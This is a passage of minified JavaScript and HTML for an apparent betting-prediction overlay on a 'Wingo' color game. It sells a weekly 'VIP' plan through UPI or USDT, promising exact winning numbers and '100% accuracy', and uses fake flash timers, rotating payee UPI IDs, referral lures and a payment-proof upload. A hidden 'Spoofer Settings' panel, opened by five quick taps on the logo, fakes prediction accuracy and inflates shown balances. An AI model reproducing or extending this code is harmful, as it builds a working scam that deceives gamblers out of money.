class="vip-ball" alt=""> <img src="/assets/png/ball_3-CSGWgLyY.png" class="vip-ball" alt=""> <img src="/assets/png/ball_4-CU90k0Z5.png" class="vip-ball" alt=""> <img src="/assets/png/ball_5-DD5VBkEF.png" class="vip-ball" alt=""> <img src="/assets/png/ball_6-CRRe003w.png" class="vip-ball" alt=""> <img src="/assets/png/ball_7-Cf2z_aqK.png" class="vip-ball" alt=""> <img src="/assets/png/ball_8-BWd7rcUJ.png" class="vip-ball" alt=""> <img src="/assets/png/ball_9-DDw5YEZU.png" class="vip-ball" alt=""> <\/div> <div class="vip-flash-strip"> <div class="vip-flash-copy"> <span class="vip-flash-badge">Flash Drop<\/span> <span class="vip-flash-saving">Save ₹900 today<\/span> <\/div> <div class="vip-flash-clock"> <span>Ends in<\/span> <strong data-vip-flash-timer>02:00:00<\/strong> <\/div> <\/div> <div class="vip-perks"> <div class="vip-perk-item"> <svg class="vip-perk-mark" viewBox="0 0 16 16"> <path d="M3.5 8.2l2.8 2.8 6.2-6.4" /> <\/svg> <div class="vip-perk-content"> <span class="vip-perk-title">Get Number Prediction<\/span> <span class="vip-perk-desc">Get exact winning number before result<\/span> <\/div> <svg class="vip-perk-arrow" viewBox="0 0 24 24"> <path d="M9 5l7 7-7 7" /> <\/svg> <\/div> <div class="vip-perk-item"> <svg class="vip-perk-mark" viewBox="0 0 16 16"> <path d="M3.5 8.2l2.8 2.8 6.2-6.4" /> <\/svg> <div class="vip-perk-content"> <span class="vip-perk-title">100% Accuracy Guaranteed<\/span> <span class="vip-perk-desc">Every prediction verified with past results<\/span> <\/div> <svg class="vip-perk-arrow" viewBox="0 0 24 24"> <path d="M9 5l7 7-7 7" /> <\/svg> <\/div> <div class="vip-perk-item"> <svg class="vip-perk-mark" viewBox="0 0 16 16"> <path d="M3.5 8.2l2.8 2.8 6.2-6.4" /> <\/svg> <div class="vip-perk-content"> <span class="vip-perk-title">Number + Color + Big/Small<\/span> <span class="vip-perk-desc">All three markets covered in one signal<\/span> <\/div> <svg class="vip-perk-arrow" viewBox="0 0 24 24"> <path d="M9 5l7 7-7 7" /> <\/svg> <\/div> <div class="vip-perk-item"> <svg class="vip-perk-mark" viewBox="0 0 16 16"> <path d="M3.5 8.2l2.8 2.8 6.2-6.4" /> <\/svg> <div class="vip-perk-content"> <span class="vip-perk-title">Auto-Mining Built In<\/span> <span class="vip-perk-desc">Set it once, earn while you sleep<\/span> <\/div> <svg class="vip-perk-arrow" viewBox="0 0 24 24"> <path d="M9 5l7 7-7 7" /> <\/svg> <\/div> <\/div> <div class="vip-offer-foot"> <div class="vip-price-line"> <span class="vip-price-old">₹2,399<\/span><span class="vip-price-amt">₹1,499<\/span><span class="vip-price-unit">/ week<\/span> <\/div> <p class="vip-price-meta">UPI flash price · Crypto stays $24<\/p> <button class="vip-checkout-btn" id="btn-vip-checkout">Join Now<\/button> <\/div> <\/div> <\/div> <\/div> <div class="view view-vip-pay"> <div class="vip-header"> <button class="back-btn" id="btn-vip-pay-back" aria-label="Back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <span class="vip-header-label">Select Payment<\/span> <button class="vip-hist-btn" id="btn-vip-history" aria-label="History"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <circle cx="12" cy="12" r="10" /> <polyline points="12 6 12 12 16 14" /> <\/svg><\/button> <\/div> <div class="vip-pay-shell"> <div class="vip-flash-strip vip-flash-strip-pay"> <div class="vip-flash-copy"> <span class="vip-flash-badge">Limited Drop<\/span> <span class="vip-flash-saving">₹900 instant saving<\/span> <\/div> <div class="vip-flash-clock"> <span>Ends in<\/span> <strong data-vip-flash-timer>02:00:00<\/strong> <\/div> <\/div> <div class="vip-pay-card"> <div class="vip-pay-summary"> <span class="vip-pay-summary-lbl">UPI Flash Price<\/span> <span class="vip-pay-summary-amt"><s>₹2,399<\/s>₹1,499<\/span> <\/div> <div class="vip-pay-options"> <button class="vip-pay-opt vip-pay-upi" id="btn-pay-upi"> <div class="vip-pay-opt-icon"><svg viewBox="0 0 24 24"> <path d="M21 7H3a2 2 0 00-2 2v10a2 2 0 002 2h18a2 2 0 002-2V9a2 2 0 00-2-2zm0 2v2h-3a2 2 0 100 4h3v2H3V9h18zm-5 2h1v2h-1v-2z" /> <\/svg><\/div> <div class="vip-pay-opt-body"> <div class="vip-pay-opt-top"> <span class="vip-pay-opt-name">UPI<\/span> <span class="card-badge badge-upi">Instant<\/span> <\/div> <span class="vip-pay-opt-desc">GPay, PhonePe, Paytm, QR<\/span> <\/div> <svg class="vip-pay-opt-arrow" viewBox="0 0 24 24"> <path d="M9 5l7 7-7 7" /> <\/svg> <\/button> <button class="vip-pay-opt vip-pay-crypto" id="btn-pay-crypto"> <div class="vip-pay-opt-icon"><svg viewBox="0 0 24 24"> <path d="M12 2l9 5.5v9L12 22l-9-5.5v-9L12 2zm0 2.2L5.5 8.5 12 12.8l6.5-4.3L12 4.2zm7.5 6.1L12 14.6 4.5 10.3v6.7L12 20.8l7.5-3.8v-6.7z" /> <\/svg><\/div> <div class="vip-pay-opt-body"> <div class="vip-pay-opt-top"> <span class="vip-pay-opt-name">Crypto<\/span> <span class="card-badge badge-crypto">USDT/TRX<\/span> <\/div> <span class="vip-pay-opt-desc">Fixed price · $24 USDT<\/span> <\/div> <svg class="vip-pay-opt-arrow" viewBox="0 0 24 24"> <path d="M9 5l7 7-7 7" /> <\/svg> <\/button> <\/div> <\/div> <div class="vip-pay-foot"> <span class="vip-pay-trust"><span class="status-dot"><\/span>Safe Payments<\/span> <span class="vip-pay-trust-sep">·<\/span> <span>Secure Checkout<\/span> <\/div> <\/div> <\/div> <div class="view view-vip-checkout"> <div class="vip-header"> <button class="back-btn" id="btn-vip-checkout-back" aria-label="Back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <span class="vip-header-label" id="vip-checkout-title">Payment<\/span> <\/div> <div class="vip-checkout-shell"> <div class="vip-checkout-card"> <div class="vip-checkout-head"> <div class="vip-checkout-stat"> <span class="vip-checkout-stat-lbl">Offer Timer<\/span> <span class="vip-checkout-stat-val" id="vip-checkout-timer">02:00:00<\/span> <\/div> <div class="vip-checkout-stat vip-checkout-stat-amt"> <span class="vip-checkout-stat-lbl">Amount<\/span> <span class="vip-checkout-stat-val" id="vip-checkout-amount">₹1,499<\/span> <\/div> <\/div> <div class="vip-checkout-qr"> <div class="vip-checkout-qr-frame"> <img id="vip-qr-img" src="" alt="Scan to pay"> <\/div> <p class="vip-checkout-qr-hint">Scan With Your Payment App<\/p> <\/div> <div class="vip-checkout-detail-row"> <span class="vip-detail-lbl">Order ID<\/span> <span class="vip-detail-val" id="vip-order-id">—<\/span> <\/div> <div class="vip-checkout-payto"> <div class="vip-checkout-payto-hdr"> <span class="vip-detail-lbl" id="vip-address-lbl">UPI ID<\/span> <span class="vip-network-lbl" id="vip-network-lbl" style="display:none;">TRC20<\/span> <\/div> <div class="vip-checkout-payto-row"> <span class="vip-address-val" id="vip-address-val">—<\/span> <button type="button" class="vip-copy-btn" id="btn-vip-copy" aria-label="Copy">Copy<\/button> <\/div> <button type="button" id="vip-upi-hint" class="vip-upi-hint" style="display:none;"> <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2.5"> <path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.3" /> <\/svg> Change UPI ID <\/button> <\/div> <div class="vip-checkout-foot"> <button class="vip-checkout-btn" id="btn-vip-confirm">Confirm Payment<\/button> <\/div> <\/div> <div class="vip-pay-foot"> <span class="vip-pay-trust"><span class="status-dot"><\/span>Safe payments<\/span> <span class="vip-pay-trust-sep">·<\/span> <span>Secure checkout<\/span> <\/div> <\/div> <\/div> <div class="view view-vip-submit"> <div class="vip-header"> <button class="back-btn" id="btn-vip-submit-back" aria-label="Back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <span class="vip-header-label">Submit Proof<\/span> <\/div> <div class="vip-checkout-shell"> <div class="vip-checkout-card"> <div class="vip-proof-section"> <label class="vip-proof-lbl" for="vip-utr-input">UTR / Transaction Hash<\/label> <input type="text" id="vip-utr-input" class="vip-proof-input" placeholder="12-digit UTR or TxHash" autocomplete="off" spellcheck="false"> <\/div> <div class="vip-proof-section"> <label class="vip-proof-lbl">Payment Screenshot<\/label> <div class="vip-file-zone" id="vip-file-zone"> <input type="file" id="vip-file-input" accept="image/*" hidden> <div class="vip-file-placeholder" id="vip-file-placeholder"> <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="3" y="3" width="18" height="18" rx="2" ry="2"><\/rect> <circle cx="8.5" cy="8.5" r="1.5"><\/circle> <polyline points="21 15 16 10 5 21"><\/polyline> <\/svg> <span>Tap to Upload<\/span> <\/div> <img id="vip-file-preview" class="vip-file-preview" src="" alt="Payment screenshot preview"> <button type="button" class="vip-file-remove" id="btn-vip-file-remove" aria-label="Remove screenshot">&times;<\/button> <\/div> <\/div> <div class="vip-checkout-foot"> <button class="vip-checkout-btn" id="btn-vip-submit-proof">Submit Proof<\/button> <\/div> <\/div> <div class="vip-pay-foot"> <span class="vip-pay-trust"><span class="status-dot"><\/span>Safe payments<\/span> <span class="vip-pay-trust-sep">·<\/span> <span>Secure checkout<\/span> <\/div> <\/div> <\/div> <div class="view view-vip-history"> <div class="vip-header"> <button class="back-btn" id="btn-vip-history-back" aria-label="Back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <span class="vip-header-label">Order History<\/span> <\/div> <div class="vip-history-shell"> <div class="vip-history-card"> <div class="vip-history-list" id="vip-history-list"><\/div> <\/div> <div class="vip-pay-foot"> <span class="vip-pay-trust"><span class="status-dot"><\/span>Safe payments<\/span> <span class="vip-pay-trust-sep">·<\/span> <span>Secure checkout<\/span> <\/div> <\/div> <\/div> <div class="view view-settings"> <div class="pro-top"> <button class="back-btn" id="btn-settings-back" aria-label="Back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <span class="settings-header-label">Spoofer Settings<\/span> <\/div> <div class="spoofer-card"> <div class="spoofer-section"> <label class="spoofer-label">Prediction Accuracy<\/label> <div class="spoofer-row"> <input type="range" id="spoof-acc-range" min="0" max="100" step="1" value="70"> <input type="number" id="spoof-acc-num" min="0" max="100" value="70"> <span class="spoofer-unit">%<\/span> <\/div> <\/div> <div class="spoofer-section"> <label class="spoofer-label">Spoof Balance Offset<\/label> <div class="spoofer-row"> <input type="number" id="spoof-bal" min="0" step="100" value="5000"> <span class="spoofer-unit">₹<\/span> <\/div> <\/div> <button class="spoofer-reset" id="btn-spoof-reset">Reset Defaults<\/button> <\/div> <div class="spoofer-card" style="margin-top: 10px;"> <label class="spoofer-label">Withdrawal Requests<\/label> <div id="spoof-withdrawals-list"><\/div> <\/div> <\/div> <div class="view view-pro"> <div class="pro-top"> <button class="back-btn" id="btn-pro-back" aria-label="Back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <div class="pro-gameinfo"> <div class="pro-gameinfo-row"><span class="pro-game-name" id="pro-mode">—<\/span><span class="pro-live-badge"><span class="live-pip"><\/span>Live<\/span><\/div> <span class="pro-round" id="pro-period">—<\/span> <\/div> <\/div> <div class="pro-timer-wrap" id="pro-timer-wrap"> <div class="pro-timer-label">Time Remaining<\/div> <span class="pro-timer" id="pro-timer">00:00<\/span> <\/div> <div class="pro-card" id="pro-card"> <div class="pro-scanning" id="pro-waiting"> <div class="scan-rings"> <div class="scan-ring-o"><\/div> <div class="scan-ring-i"><\/div> <\/div> <span class="scan-label" id="scan-lbl">Scanning<span class="s-dot"><\/span><span class="s-dot"><\/span><span class="s-dot"><\/span><\/span> <\/div> <div class="pro-prediction" id="pro-prediction" style="display:none"> <div class="streak-badge" id="streak-badge"><span>🔥<\/span><span id="streak-text">—<\/span><\/div> <div class="pred-hero"> <div class="pred-glow" id="pred-glow"><\/div> <div class="pred-ball" id="hero-ball"><\/div> <\/div> <div class="pred-tags"><span class="pred-size" id="pred-pill">Big<\/span><span class="pred-color" id="pred-color">Red<\/span><\/div> <div class="pred-conf"> <div class="conf-track"> <div class="conf-fill" id="conf-fill"><\/div> <\/div><span class="conf-pct" id="conf-pct">0%<\/span> <\/div> <div class="pred-history" id="pred-history"><span class="hist-label">Recent<\/span><\/div> <\/div> <\/div> <\/div> <div class="view view-mining"> <div class="vip-header"> <button class="back-btn" id="btn-mining-back" aria-label="Back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <span class="vip-header-label">Auto Mining<\/span> <button class="mine-hist-btn" id="btn-mining-history" aria-label="History"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <circle cx="12" cy="12" r="10" /> <polyline points="12 6 12 12 16 14" /> <\/svg><\/button> <span class="mine-energy-pill" style="display:none"><svg class="energy-svg" viewBox="0 0 24 24"> <path d="M12 2L4.5 14h6v8L18 10h-6V2z" /> <\/svg><span id="mine-energy-count">10<\/span><\/span> <\/div> <div class="mine-shell"> <div class="mine-card"> <div class="mine-row"> <span class="mine-lbl"><svg class="mine-lbl-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="2" y="6" width="20" height="12" rx="2" /> <path d="M22 10H2" /> <circle cx="17" cy="14" r="1.5" /> <\/svg>Available Balance<\/span> <span class="mine-val" id="mine-current-bal">₹5,000.00<\/span> <\/div> <div class="mine-row"> <span class="mine-lbl"><svg class="mine-lbl-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <circle cx="12" cy="12" r="10" /> <circle cx="12" cy="12" r="6" /> <circle cx="12" cy="12" r="2" /> <\/svg>Target Balance<\/span> <div class="mine-input-wrap"> <span class="mine-symbol">₹<\/span> <input type="number" id="mine-target-goal" class="mine-input" min="100" step="100" value="10000" placeholder="10000"> <\/div> <\/div> <div class="mine-row"> <span class="mine-lbl"><svg class="mine-lbl-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <path d="M12 22s-8-4.5-8-11.8A8 8 0 0 1 12 2a8 8 0 0 1 8 8.2c0 7.3-8 11.8-8 11.8z" /> <circle cx="12" cy="10" r="3" /> <\/svg>Stop Balance<\/span> <div class="mine-input-wrap"> <span class="mine-symbol">₹<\/span> <input type="number" id="mine-stop-loss" class="mine-input" min="0" step="100" value="" placeholder="No Limit"> <\/div> <\/div> <div class="mine-terminal-section"> <div class="mining-terminal" id="mine-console"> <div class="console-line active">System ready to mine...<\/div> <\/div> <\/div> <div class="mine-card-foot"> <button class="mine-cta" id="btn-mining-start">Start Mining · 1 Energy<\/button> <p class="mine-note">Stops Automatically at Target Balance<\/p> <\/div> <\/div> <\/div> <div class="mining-energy-modal" id="mining-energy-modal" style="display: none;"> <button class="energy-modal-close" id="btn-energy-close" aria-label="Close"> <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"> <path d="M18 6L6 18M6 6l12 12" /> <\/svg> <\/button> <div class="energy-modal-content"> <div class="energy-modal-icon"> <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg"> <rect x="6" y="18" width="44" height="28" rx="6" stroke="currentColor" stroke-width="3.5" /> <rect x="50" y="26" width="8" height="12" rx="3" fill="currentColor" opacity="0.3" /> <rect x="12" y="24" width="8" height="16" rx="2" fill="currentColor" opacity="0.2" /> <\/svg> <\/div> <div class="energy-modal-title">You\'re Out of Energy<\/div> <div class="energy-modal-desc">Each mining session uses one energy unit. Get a free boost below to start right away.<\/div> <div class="energy-modal-actions"> <button class="energy-btn-primary" id="btn-energy-boost">Get Free Energy<\/button> <button class="energy-btn-secondary" id="btn-energy-topup">Buy More Energy<\/button> <\/div> <\/div> <\/div> <div class="mining-history-modal" id="mining-history-modal" style="display: none;"> <button class="energy-modal-close" id="btn-history-close" aria-label="Close"> <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"> <path d="M18 6L6 18M6 6l12 12" /> <\/svg> <\/button> <div class="history-modal-content"> <div class="history-modal-title">Mining History<\/div> <div class="history-list" id="mining-history-list"><\/div> <button class="history-clear-btn" id="btn-history-clear">Clear History<\/button> <\/div> <\/div> <\/div> <\/div> <div class="gate-view"> <div class="gate-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"> <rect x="3" y="11" width="18" height="11" rx="2" ry="2"><\/rect> <path d="M7 11V7a5 5 0 0 1 10 0v4"><\/path> <\/svg><\/div> <h3 class="gate-title">Predictions Locked<\/h3> <div class="gate-bal-wrap"><span class="gate-balance" id="gate-bal">₹0.00<\/span><\/div> <p class="gate-desc">Minimum ₹500 balance required to<br>access real-time predictions.<\/p> <div class="gate-actions"> <button class="gate-btn btn-deposit">Deposit Now<\/button> <button class="gate-btn btn-telegram">Join Telegram<\/button> <\/div> <\/div><\/div><div class="bonus-view" id="bonus-view"> <div class="bonus-hdr"> <button class="bonus-back-btn" id="btn-bonus-back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <span class="bonus-ttl">Referral Bonus<\/span> <\/div> <div class="bonus-scroll"> <div class="bonus-hero"> <div class="bonus-hero-icon">💰<\/div> <h2 class="bonus-h2">Invite &amp; Earn<\/h2> <p class="bonus-sub">Refer friends and earn commission on every deposit they make. No limits.<\/p> <\/div> <div class="bonus-stats-row"> <div class="bonus-stat"><span class="bonus-stat-val">₹1,000<\/span><span class="bonus-stat-lbl">Per referral<\/span> <\/div> <div class="bonus-stat"><span class="bonus-stat-val">∞<\/span><span class="bonus-stat-lbl">No cap<\/span><\/div> <div class="bonus-stat"><span class="bonus-stat-val">Instant<\/span><span class="bonus-stat-lbl">Payout<\/span> <\/div> <\/div> <div class="bonus-prog-card"> <div class="bonus-prog-lbl"><span>Your progress<\/span><span class="bonus-prog-count">0 / 10 Qualified<\/span><\/div> <div class="bonus-bar"> <div class="bonus-bar-fill"><\/div> <\/div> <\/div> <div class="bonus-tiers"> <div class="bonus-section-ttl">Reward Tiers<\/div> <div class="bonus-tier"><span class="tier-badge t-bronze">5<\/span><span class="tier-info">5 referrals → <b>₹5,000<\/b> + Bronze badge<\/span><\/div> <div class="bonus-tier"><span class="tier-badge t-silver">10<\/span><span class="tier-info">10 referrals → <b>₹10,000<\/b> + Silver badge<\/span><\/div> <div class="bonus-tier"><span class="tier-badge t-gold">25<\/span><span class="tier-info">25 referrals → <b>₹30,000<\/b> + Gold badge<\/span><\/div> <div class="bonus-tier"><span class="tier-badge t-diamond">50<\/span><span class="tier-info">50 referrals → <b>₹75,000<\/b> + VIP access<\/span><\/div> <\/div> <button class="bonus-cta-btn" id="btn-copy-invite">Copy Invite Link<\/button> <div class="bonus-link-preview" id="bonus-link-preview"><\/div> <div class="bonus-rules"> <div class="bonus-section-ttl">How it works<\/div> <div class="bonus-rule">1. Share your unique invite link with friends<\/div> <div class="bonus-rule">2. Friend registers using your link<\/div> <div class="bonus-rule">3. Friend makes their first deposit (min ₹500)<\/div> <div class="bonus-rule">4. Bonus credited instantly to your wallet<\/div> <\/div> <div class="bonus-rules"> <div class="bonus-section-ttl">Terms<\/div> <div class="bonus-rule">• Referral must make a minimum first deposit of ₹500<\/div> <div class="bonus-rule">• Self-referral is not permitted<\/div> <div class="bonus-rule">• Bonus is credited as withdrawable balance<\/div> <div class="bonus-rule">• Management reserves the right to modify terms<\/div> <\/div> <\/div><\/div><div class="wg-overlay inactive" id="wg-promo-overlay"><\/div><div class="wg-popup inactive" id="wg-promo-banner"> <div class="wg-close-x" id="wg-promo-close">✕<\/div> <div class="wg-pop-hero"> <div class="wg-pop-icon">💰<\/div> <div class="wg-pop-amount">FREE ₹1,000<\/div> <div class="wg-pop-pill">Per Referral &bull; No Limit &bull; Instant Payout<\/div> <\/div> <div class="wg-pop-stats"> <div class="wg-stat-chip">💸 Instant<\/div> <div class="wg-stat-chip">♾️ No Cap<\/div> <div class="wg-stat-chip">✅ Verified<\/div> <\/div> <div class="wg-pop-body">Invite friends to join. Every time they deposit, you earn ₹1,000 commission — instantly credited, zero waiting.<\/div> <button class="wg-pop-cta" id="wg-promo-cta">🎁 Claim Free Bonus →<\/button> <div class="wg-pop-footer"> <div class="wg-checkbox" id="wg-promo-check" role="checkbox" aria-checked="false"> <div class="wg-checkbox__icon"><span class="wg-check-tick">✓<\/span><\/div> <\/div> <span class="wg-no-remind" id="wg-promo-remind">No More Reminders Today<\/span> <\/div><\/div>'),
          (this._logo = n.querySelector(".logo")),
          (this._panel = n.querySelector(".panel")),
          (this._header = n.querySelector(".panel-header")),
          (this._closeBtn = n.querySelector(".close-btn")),
          (this._gateView = n.querySelector(".gate-view")),
          (this._body = n.querySelector(".panel-body")),
          (this._gateBal = n.querySelector("#gate-bal")),
          Ti(n),
          bn(this, An("logo")),
          So(this, this._logo, { onTap: () => this._showPanel() }),
          Eo(this, this._header, this._panel),
          this._closeBtn.addEventListener("pointerdown", ($) =>
            $.stopPropagation(),
          ),
          this._closeBtn.addEventListener("click", () => this._showLogo()),
          n
            .querySelector(".btn-deposit")
            .addEventListener("click", () => (location.href = xi)),
          n
            .querySelector(".btn-telegram")
            .addEventListener("click", () =>
              window.open("https://telegram.dog/predictwingoo", "_blank"),
            ),
          n.querySelector("#btn-pro").addEventListener("click", () => {
            (this._setView("pro"),
              fo(-1),
              pn("loading"),
              xo(),
              this._checkBalance());
          }),
          n
            .querySelector("#btn-status-tg")
            .addEventListener("click", () => this._setView("tg")),
          n
            .querySelector("#btn-vip")
            .addEventListener("click", () => this._setView("vip")),
          n.querySelector("#btn-mine").addEventListener("click", () => {
            (this._setView("mining"), this._checkBalance());
          }),
          n
            .querySelector("#btn-tg-back")
            .addEventListener("click", () => this._setView("menu")),
          n
            .querySelector("#btn-vip-back")
            .addEventListener("click", () => this._setView("menu")),
          n
            .querySelector("#btn-pro-back")
            .addEventListener("click", () => this._setView("menu")),
          n
            .querySelector("#btn-vip-pay-back")
            .addEventListener("click", () => this._setView("vip")),
          n
            .querySelector("#btn-tg-join")
            .addEventListener("click", () =>
              window.open("https://telegram.dog/predictwingoo", "_blank"),
            ),
          n
            .querySelector("#btn-vip-checkout")
            .addEventListener("click", () => this._setView("vip-pay")),
          n
            .querySelector("#btn-pay-upi")
            .addEventListener("click", () => this._startVipCheckout("upi")),
          n
            .querySelector("#btn-pay-crypto")
            .addEventListener("click", () => this._startVipCheckout("crypto")),
          n
            .querySelector("#btn-vip-checkout-back")
            .addEventListener("click", () => {
              if ((this._setView("vip-pay"), Un)) clearInterval(Un);
            }),
          n.querySelector("#btn-vip-confirm").addEventListener("click", () => {
            (this._setView("vip-submit"),
              (n.querySelector("#vip-utr-input").value = ""),
              (n.querySelector("#vip-file-input").value = ""),
              (n.querySelector("#vip-file-preview").style.display = "none"),
              (n.querySelector("#vip-file-placeholder").style.display = "flex"),
              (n.querySelector("#btn-vip-file-remove").style.display = "none"));
          }),
          n
            .querySelector("#btn-vip-submit-back")
            .addEventListener("click", () => {
              this._setView("vip-checkout");
            }),
          n.querySelector("#btn-vip-history").addEventListener("click", () => {
            (this._renderVipHistory(),
              this._setView("vip-history"),
              this._syncVipHistory());
          }),
          n
            .querySelector("#btn-vip-history-back")
            .addEventListener("click", () => {
              this._setView("vip-pay");
            }),
          n.querySelector("#vip-file-zone").addEventListener("click", () => {
            n.querySelector("#vip-file-input").click();
          }),
          n.querySelector("#vip-file-input").addEventListener("change", ($) => {
            let J = $.target.files[0];
            if (J) {
              let z = new FileReader();
              ((z.onload = (O) => {
                ((n.querySelector("#vip-file-preview").src = O.target.result),
                  (n.querySelector("#vip-file-preview").style.display =
                    "block"),
                  (n.querySelector("#vip-file-placeholder").style.display =
                    "none"),
                  (n.querySelector("#btn-vip-file-remove").style.display =
                    "flex"));
              }),
                z.readAsDataURL(J));
            }
          }),
          n
            .querySelector("#btn-vip-file-remove")
            .addEventListener("click", ($) => {
              ($.preventDefault(),
                $.stopPropagation(),
                (n.querySelector("#vip-file-input").value = ""));
              let J = n.querySelector("#vip-file-preview");
              ((J.src = ""),
                (J.style.display = "none"),
                (n.querySelector("#vip-file-placeholder").style.display =
                  "flex"),
                (n.querySelector("#btn-vip-file-remove").style.display =
                  "none"));
            }),
          n
            .querySelector("#btn-vip-submit-proof")
            .addEventListener("click", () => {
              let $ = n.querySelector("#vip-utr-input"),
                J = n.querySelector("#vip-file-input"),
                z = $.value.trim();
              if (!z) {
                alert("Please enter your UTR / Transaction Hash");
                return;
              }
              let O = n.querySelector("#btn-vip-submit-proof");
              ((O.textContent = "Uploading..."), (O.disabled = !0));
              let U = new FormData();
              (U.append("utr", z),
                U.append("type", this._checkoutType || "upi"),
                U.append(
                  "amount",
                  this._checkoutType === "crypto"
                    ? B.cryptoAmountUsd.toFixed(2) + " USDT"
                    : "₹" + B.amount,
                ));
              let a = "Unknown";
              try {
                a =
                  sessionStorage.getItem("wg_user") ||
                  localStorage.getItem("wg_user") ||
                  "Unknown";
              } catch (y) {}
              if ((U.append("user", a), J.files[0]))
                U.append("screenshot", J.files[0]);
              fetch("/ar-api/vip-submit", { method: "POST", body: U })
                .then((y) => y.json())
                .then((y) => {
                  if (y.ok) {
                    let e = [];
                    try {
                      e = JSON.parse(
                        localStorage.getItem("wg_vip_orders") || "[]",
                      );
                    } catch (u) {}
                    (e.unshift({
                      type: this._checkoutType || "upi",
                      utr: z,
                      date: Date.now(),
                      status: "Pending",
                    }),
                      localStorage.setItem("wg_vip_orders", JSON.stringify(e)),
                      (O.textContent = "Submitted ✓"),
                      (O.style.cssText =
                        "background: #10b981; color: #fff; border-color: #10b981;"),
                      setTimeout(() => {
                        ((O.textContent = "Submit Proof"),
                          (O.style.cssText = ""),
                          (O.disabled = !1),
                          this._renderVipHistory(),
                          this._setView("vip-history"));
                      }, 1500));
                  } else
                    (alert(
                      y.error || "Failed to submit proof. Please try again.",
                    ),
                      (O.textContent = "Submit Proof"),
                      (O.disabled = !1));
                })
                .catch((y) => {
                  (console.error(y),
                    alert("Connection error. Please try again."),
                    (O.textContent = "Submit Proof"),
                    (O.disabled = !1));
                });
            }),
          n.querySelector("#btn-vip-copy").addEventListener("click", () => {
            let $ = n.querySelector("#vip-address-val").textContent;
            ((z) => {
              let O = document.createElement("textarea");
              ((O.value = z),
                (O.style.position = "fixed"),
                (O.style.opacity = "0"),
                (O.style.left = "-9999px"),
                n.appendChild(O),
                O.focus(),
                O.select(),
                O.setSelectionRange(0, 99999));
              let U = !1;
              try {
                U = document.execCommand("copy");
              } catch (a) {}
              if ((n.removeChild(O), U)) return Promise.resolve();
              if (navigator.clipboard) return navigator.clipboard.writeText(z);
              return Promise.reject();
            })($)
              .then(() => {
                let z = n.querySelector("#btn-vip-copy"),
                  O = z.textContent;
                ((z.textContent = "Copied!"),
                  z.classList.add("copied"),
                  setTimeout(() => {
                    ((z.textContent = O), z.classList.remove("copied"));
                  }, 2000));
              })
              .catch((z) => {
                console.error("Copy failed:", z);
              });
          }),
          n.querySelector("#vip-upi-hint").addEventListener("click", () => {
            Tn = (Tn + 1) % B.upi.length;
            let $ = B.upi[Tn];
            n.querySelector("#vip-address-val").textContent = $;
            let J = encodeURIComponent($),
              z = encodeURIComponent("VIP"),
              O = encodeURIComponent(B.amount),
              U = `upi://pay?pa=${J}&pn=${z}&am=${O}&cu=INR`,
              a = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(U)}`;
            n.querySelector("#vip-qr-img").src = a;
          }),
          n
            .querySelector("#btn-settings-back")
            .addEventListener("click", () => this._setView("menu")),
          n.querySelector("#btn-spoof-reset").addEventListener("click", () => {
            (window.__wgSpoofer.saveSetting("accuracy", 70),
              window.__wgSpoofer.saveSetting("balanceOffset", 5000),
              window.__wgSpoofer.resetBalance(),
              this._syncSettings());
          }));
        let t = [],
          o = n.querySelector(".panel-title img");
        o.style.pointerEvents = "auto";
        let i = () => {
          if (!window.__wgSpoofer || !window.__wgSpoofer.isVip()) return;
          if ((t.push(Date.now()), t.length >= 5)) {
            if (t[t.length - 1] - t[t.length - 5] < 2000)
              ((t.length = 0), this._setView("settings"), this._syncSettings());
            if (t.length > 10) t.splice(0, t.length - 5);
          }
        };
        (o.addEventListener(
          "pointerdown",
          ($) => {
            ($.stopImmediatePropagation(), $.stopPropagation());
          },
          !0,
        ),
          o.addEventListener("pointerup", i, !0),
          o.addEventListener("click", i));
        let c = n.querySelector("#spoof-acc-range"),
          f = n.querySelector("#spoof-acc-num"),
          p = n.querySelector("#spoof-bal");
        (c.addEventListener("input", () => {
          ((f.value = c.value),
            window.__wgSpoofer.saveSetting("accuracy", parseInt(c.value)));
        }),
          f.addEventListener("input", () => {
            ((c.value = f.value),
              window.__wgSpoofer.saveSetting("accuracy", parseInt(f.value)));
          }),
          p.addEventListener("input", () => {
            (window.__wgSpoofer.saveSetting(
              "balanceOffset",
              parseInt(p.value) || 0,
            ),
              window.__wgSpoofer.resetBalance());
